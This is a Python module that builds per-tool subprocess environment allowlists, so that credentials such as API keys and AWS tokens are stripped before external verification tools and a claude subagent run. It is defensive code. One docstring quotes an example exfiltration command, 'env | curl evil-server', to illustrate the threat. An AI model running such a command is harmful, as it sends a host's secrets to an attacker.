"""ATH-1212: per-tool subprocess env allowlists.

When the SDK invokes external tools (yosys, ebmc, lake, lean, ACL2,
verilator, Cedar, git, etc.), the subprocess inherits the FULL parent
env by default — including ANTHROPIC_API_KEY, ATHANOR_SYNC_TOKEN,
AWS_ACCESS_KEY_ID, customer keys, license tokens. A compromised or
malicious tool binary (or a malicious customer file that triggers a
tool's exploit) could read those and exfiltrate.

Per-tool allowlists strip everything except a minimal set known to be
needed by each tool. Defense-in-depth: new credentials added to the
env are denied by default; explicit deny entries are unnecessary.

Usage::

    from kairos.security.env_allowlist import safe_env_for_yosys
    subprocess.run(["yosys", *args], env=safe_env_for_yosys())

The receipt-test for ATH-1212 lives at ``tests/test_env_allowlist.py``
and asserts that each safe_env_for_* function strips a known-sensitive
sentinel env var. Per the no-vacuous rule, that test is the proof the
allowlist actually filters.
"""
from __future__ import annotations

import os

# Universal baseline — vars every CLI tool reasonably needs on a Linux
# host. PATH for binary lookup, HOME for dotfile config, TERM/LANG/LC_ALL
# for terminal/locale output, TMPDIR/TMP/TEMP for tools that write
# scratch files. USER + SHELL are baseline-safe metadata.
_BASELINE: frozenset[str] = frozenset(
    {
        "HOME",
        "PATH",
        "USER",
        "SHELL",
        "TERM",
        "LANG",
        "LC_ALL",
        "TMPDIR",
        "TMP",
        "TEMP",
    }
)

# Tool-specific extras. Only added on top of baseline; the union with
# _BASELINE is the per-tool allowlist.
#
# Each extra set is named after the tool. Comments cite the env var's
# purpose so a future reader can verify the allowlist is still minimal.

_YOSYS_EXTRA: frozenset[str] = frozenset()
# yosys reads `~/.yosys` (HOME covers), finds plugins via PATH. No
# additional env needed. (Verified 2026-05-13 via `ldd yosys` + yosys
# manual.)

_EBMC_EXTRA: frozenset[str] = frozenset()
# EBMC binary is statically linked (verified 2026-05-13 `ldd ebmc` →
# "not a dynamic executable"). Baseline is sufficient.

_LEAN_EXTRA: frozenset[str] = frozenset(
    {
        "LEAN_PATH",         # lean lib search path
        "ELAN_HOME",         # elan toolchain manager root
        "ELAN_TOOLCHAIN",    # active lean toolchain override
        "MATHLIB_CACHE_DIR", # mathlib4 cache location
        # Docker-transport env vars for lean/lake-via-docker invocations.
        # `src/kairos/lean.py` shells out to `docker run` to execute lean
        # or lake inside the leanprover/lean4 (or customer-pinned) image
        # at two sites (lines ~791 + ~1462). Customers using a remote
        # docker daemon (DOCKER_HOST=tcp://...) or TLS-auth
        # (DOCKER_CERT_PATH + DOCKER_TLS_VERIFY) need these propagated
        # so the host-side docker client locates + authenticates to the
        # daemon. Stripping them would force a fallback to
        # /var/run/docker.sock and break remote-daemon customer setups.
        #
        # Same (a)-extended precedent as cedar (PR #635) — extending the
        # tool factory rather than adding a sibling safe_env_for_docker
        # because lean/lake IS the tool; docker is the transport. Both
        # safe_env_for_lean and safe_env_for_lake pick this up since
        # they share _LEAN_EXTRA.
        #
        # Seam: DOCKER_* value-semantics live in the docker CLI, not
        # in this factory. Factory is forwarding-only.
        "DOCKER_HOST",
        "DOCKER_CERT_PATH",
        "DOCKER_TLS_VERIFY",
    }
)
# lean / lake need the elan toolchain env vars to locate the active
# toolchain. LEAN_PATH propagates lib search; MATHLIB_CACHE_DIR for
# Pythia's mathlib download cache. DOCKER_* added in ATH-1212a site #9
# for the lean-via-docker / lake-via-docker invocation paths in lean.py.

_ACL2_EXTRA: frozenset[str] = frozenset(
    {
        "ACL2_SYSTEM_BOOKS",  # ACL2 community books root
    }
)
# ACL2 needs ACL2_SYSTEM_BOOKS for include resolution.

_VERILATOR_EXTRA: frozenset[str] = frozenset(
    {
        "VERILATOR_ROOT",  # verilator install root for include paths
    }
)

_CEDAR_EXTRA: frozenset[str] = frozenset(
    {
        # Docker-transport env vars. The cedar verification path
        # (src/kairos/verticals/cedar.py) shells out to `docker run` to
        # execute the cedar binary inside the cedar-fleet monolith image,
        # not directly to cedar-on-host. These three env vars are how the
        # host-side docker client locates + authenticates to the docker
        # daemon (which may be remote on customer setups). Stripping them
        # would force docker to fall back to /var/run/docker.sock and
        # break any customer using a remote daemon (DOCKER_HOST=tcp://...)
        # or TLS-auth (DOCKER_CERT_PATH + DOCKER_TLS_VERIFY=1).
        #
        # Per asabi 2026-05-14 (a)-extended: extend the cedar factory
        # rather than adding a sibling safe_env_for_docker, because cedar
        # IS the tool being invoked; docker is the transport. The factory
        # is the single source of truth for any cedar-via-docker callsite
        # added later.
        #
        # Seam: value-semantics for these vars live in docker, not here.
        # E.g., DOCKER_TLS_VERIFY is treated as truthy-when-set by some
        # docker versions and value-equals-"1" by others; the factory
        # only forwards the var, it doesn't interpret. Same for
        # DOCKER_HOST (URI parse handled by docker) and DOCKER_CERT_PATH
        # (filesystem lookup handled by docker). Future debugging that
        # touches docker-version-specific behavior should look in the
        # docker client source, not here.
        "DOCKER_HOST",
        "DOCKER_CERT_PATH",
        "DOCKER_TLS_VERIFY",
    }
)
# Cedar binary itself is a static Rust binary with no env needs; the
# DOCKER_* additions are for the docker-transport path used in
# verticals/cedar.py. ATH-1212a site #6.

_CLAUDE_SUBAGENT_EXTRA: frozenset[str] = frozenset(
    {
        # Anthropic auth — the claude CLI subagent makes API calls.
        "ANTHROPIC_API_KEY",
        "ANTHROPIC_BASE_URL",
        "ANTHROPIC_AUTH_TOKEN",
        # AWS auth for Bedrock-backed Anthropic.
        "AWS_ACCESS_KEY_ID",
        "AWS_SECRET_ACCESS_KEY",
        "AWS_SESSION_TOKEN",
        "AWS_REGION",
        "AWS_DEFAULT_REGION",
        "AWS_BEDROCK_REGION",
        # Backend routing.
        "KAIROS_ANTHROPIC_BACKEND",
        "KAIROS_AGENT_ID",
    }
)
# The claude CLI subagent is itself an Anthropic API client — unlike
# the verification tools, it NEEDS to inherit credentials. This
# allowlist explicitly forwards auth vars only. ANTHROPIC_API_KEY +
# AWS Bedrock vars are required; everything else (Athanor sync tokens,
# Supabase keys, OpenAI keys) is still stripped. Verified against the
# pre-ATH-1212 _ENV_ALLOW set in sec/closed_loop/claude_proposer.py.


def _safe_env(allow: frozenset[str]) -> dict[str, str]:
    """Build env dict containing only the allowlisted vars from os.environ."""
    return {k: v for k, v in os.environ.items() if k in allow}


def _safe_env_with_prefix(allow: frozenset[str], prefix: str) -> dict[str, str]:
    """Build env dict with allowlist + any var starting with prefix.

    Used for git's ``GIT_*`` family (GIT_AUTHOR_NAME, GIT_AUTHOR_EMAIL,
    GIT_DIR, GIT_INDEX_FILE, etc.) where listing every variant is
    error-prone.
    """
    return {
        k: v
        for k, v in os.environ.items()
        if k in allow or k.startswith(prefix)
    }


# ── Rust bridge (optional import with frozenset fallback) ─────
try:
    from kairos_env_allowlist import env_is_allowed as _rust_is_allowed  # type: ignore[import-not-found]
    _HAS_RUST_ALLOWLIST = True
except ImportError:
    _HAS_RUST_ALLOWLIST = False


# ============================================================
# Per-tool factory functions
# ============================================================
#
# Each function returns a fresh dict, so callers can mutate without
# affecting subsequent calls. The dicts are intentionally minimal —
# subprocess inherits ONLY what each function explicitly returns.


def safe_env_for_yosys() -> dict[str, str]:
    """Allowlisted env for yosys / yosys-abc invocations."""
    return _safe_env(_BASELINE | _YOSYS_EXTRA)


def safe_env_for_ebmc() -> dict[str, str]:
    """Allowlisted env for EBMC invocations."""
    return _safe_env(_BASELINE | _EBMC_EXTRA)


def safe_env_for_lean() -> dict[str, str]:
    """Allowlisted env for lean compiler invocations."""
    return _safe_env(_BASELINE | _LEAN_EXTRA)


def safe_env_for_lake() -> dict[str, str]:
    """Allowlisted env for lake build-system invocations.

    Same as lean — lake spawns lean internally and shares env vars.
    """
    return _safe_env(_BASELINE | _LEAN_EXTRA)


def safe_env_for_acl2() -> dict[str, str]:
    """Allowlisted env for ACL2 prover invocations."""
    return _safe_env(_BASELINE | _ACL2_EXTRA)


def safe_env_for_verilator() -> dict[str, str]:
    """Allowlisted env for verilator invocations."""
    return _safe_env(_BASELINE | _VERILATOR_EXTRA)


def safe_env_for_cedar() -> dict[str, str]:
    """Allowlisted env for Cedar verification invocations.

    Two invocation shapes are supported:

    1. **Cedar binary on host** (future, when the cedar Rust binary ships
       on customer hosts directly): baseline-only is sufficient — cedar is
       a static Rust binary with no env needs.

    2. **Docker-transport** (current, `src/kairos/verticals/cedar.py`):
       the cedar binary runs inside the cedar-fleet monolith Docker
       image; the host-side subprocess invokes `docker run`. Customers
       using a remote Docker daemon need ``DOCKER_HOST`` propagated;
       customers using TLS-auth to the daemon need ``DOCKER_CERT_PATH`` +
       ``DOCKER_TLS_VERIFY``. These three env vars are in the allowlist
       so the docker client behaves correctly; everything else (Athanor
       sync token, Anthropic/AWS/Supabase creds, customer secrets) is
       still stripped before reaching the docker subprocess.

    Per asabi 2026-05-14 (a)-extended decision: extending this factory
    rather than adding a sibling ``safe_env_for_docker`` because cedar IS
    the tool being invoked; docker is the transport. Future cedar-via-
    docker callsites use this same factory.

    NOTE on docker-transport value-semantics: ``DOCKER_TLS_VERIFY`` is
    forwarded as an opaque string; its value-semantics (``'1'`` /
    ``'true'`` / truthy-when-set, version-dependent) are interpreted by
    the docker CLI, not by this factory. Same for ``DOCKER_HOST`` (URI
    parsed by docker) and ``DOCKER_CERT_PATH`` (filesystem lookup
    handled by docker). This factory is forwarding-only; docker-version-
    specific debugging belongs in the docker client source.
    """
    return _safe_env(_BASELINE | _CEDAR_EXTRA)


# ATH-1230 PR 1 — shared docker-transport vars (single source of truth).
# Currently inlined in _CEDAR_EXTRA + _LEAN_EXTRA; future PR 4 in ATH-1230
# refactors those two to reference this constant. Today this constant is
# only used by `safe_env_for_eval_bash_sandbox` below — but defining it
# here (with the DRY-refactor intent documented) avoids re-introducing a
# 4th inline copy of the same 3 vars.
_DOCKER_TRANSPORT_VARS: frozenset[str] = frozenset({
    "DOCKER_HOST",
    "DOCKER_CERT_PATH",
    "DOCKER_TLS_VERIFY",
})


def safe_env_for_eval_bash_host() -> dict[str, str]:
    """Strictest baseline-only env for customer bash on host.

    Used by the fallback branch of ``_execute_bash`` in eval_harness.py
    (line 943) when no container sandbox is available. The customer's
    bash command runs directly on the host with ``shell=True``; the
    customer command itself is the threat vector. Any env var visible
    to that subprocess is exfiltratable via ``env | curl evil-server``
    or equivalent.

    Returns ONLY baseline (PATH/HOME/USER/SHELL/TERM/LANG/LC_ALL/
    TMPDIR/TMP/TEMP). No DOCKER_* (no docker subprocess), no tool
    extras, no exceptions. Athanor + Anthropic + AWS + Supabase
    credentials never reach the customer bash environment.

    Distinct from `safe_env_for_eval_bash_sandbox` because the fallback
    branch never spawns a docker client; DOCKER_HOST has no useful
    purpose there and exposing it to customer bash leaks daemon URI.

    ATH-1230 PR 1 — pairs with `safe_env_for_eval_bash_sandbox` to
    cover both `_execute_bash` branches under strict-by-default
    threat-model factoring.
    """
    return _safe_env(_BASELINE)


def safe_env_for_eval_bash_sandbox() -> dict[str, str]:
    """Baseline + DOCKER_TRANSPORT env for customer bash via container sandbox.

    Used by the sandbox branch of ``_execute_bash`` in eval_harness.py
    (line 923) — `subprocess.run([_SANDBOX_BIN, "run", ..., "bash",
    "-c", cmd], ...)`. The HOST-SIDE docker (or podman) client needs
    ``DOCKER_HOST`` + ``DOCKER_CERT_PATH`` + ``DOCKER_TLS_VERIFY`` to
    locate + authenticate to the container daemon (which may be a
    remote daemon on customer infra). Container itself is isolated
    (docker doesn't propagate host env into containers without `-e`),
    so the customer bash inside the container sees ONLY what we
    explicitly mount or set; the host-side docker-client subprocess
    is the surface we harden here.

    Athanor + Anthropic + AWS + Supabase credentials are stripped
    from the host-side docker-client subprocess env, so they don't
    appear in ``ps aux`` / ``/proc/<pid>/environ`` / debug-logging
    surfaces on the host.

    Same threat-model class as the docker-transport sites for cedar
    (PR #635) + lean (PR #638). Future PR 4 in ATH-1230 extracts
    `_DOCKER_TRANSPORT_VARS` shared with `_CEDAR_EXTRA` + `_LEAN_EXTRA`.

    Seam: DOCKER_* value-semantics live in the docker CLI, not in
    this factory. Factory is forwarding-only; docker-version-specific
    behavior belongs in the docker client source.
    """
    return _safe_env(_BASELINE | _DOCKER_TRANSPORT_VARS)


def safe_env_for_git() -> dict[str, str]:
    """Allowlisted env for git invocations.

    Includes baseline + every ``GIT_*`` env var. Customers may set
    GIT_AUTHOR_NAME / GIT_AUTHOR_EMAIL / GIT_DIR / etc. for their
    own workflow; those need to propagate so git commands behave as
    expected.
    """
    return _safe_env_with_prefix(_BASELINE, "GIT_")


def safe_env_for_claude_subagent() -> dict[str, str]:
    """Allowlisted env for the claude CLI subagent (ATH-1180).

    The subagent is itself an Anthropic API client — unlike the
    verification tools (yosys/ebmc/lake/etc.), it NEEDS to inherit
    credentials. Forwards ANTHROPIC_API_KEY / ANTHROPIC_BASE_URL /
    ANTHROPIC_AUTH_TOKEN + AWS Bedrock auth (when AWS-backed Anthropic
    is in use) + backend routing vars KAIROS_ANTHROPIC_BACKEND +
    KAIROS_AGENT_ID. Other sensitive credentials (Athanor sync token,
    Supabase keys, OpenAI/Gemini/HF tokens, KAIROS_DEV_NO_LICENSE) are
    still stripped — see ``_CLAUDE_SUBAGENT_EXTRA`` for the exact
    forwarded set.

    Polish-note fix from PR #616 cross-arm review (research): the prior
    docstring said "Baseline is sufficient — no Athanor-internal env
    propagation" which contradicted the body forwarding auth.
    """
    return _safe_env(_BASELINE | _CLAUDE_SUBAGENT_EXTRA)


# ============================================================
# Compatibility shim
# ============================================================
#
# The original ``_safe_env`` lived in ``sec/closed_loop/claude_proposer.py``
# (ATH-1180). Callers there are migrated to ``safe_env_for_claude_subagent``;
# the module-level ``_safe_env`` in claude_proposer.py is now a thin
# re-export to keep older imports working. New code should use the
# per-tool factories above.

__all__ = [
    "safe_env_for_yosys",
    "safe_env_for_ebmc",
    "safe_env_for_lean",
    "safe_env_for_lake",
    "safe_env_for_acl2",
    "safe_env_for_verilator",
    "safe_env_for_cedar",
    "safe_env_for_git",
    "safe_env_for_claude_subagent",
]
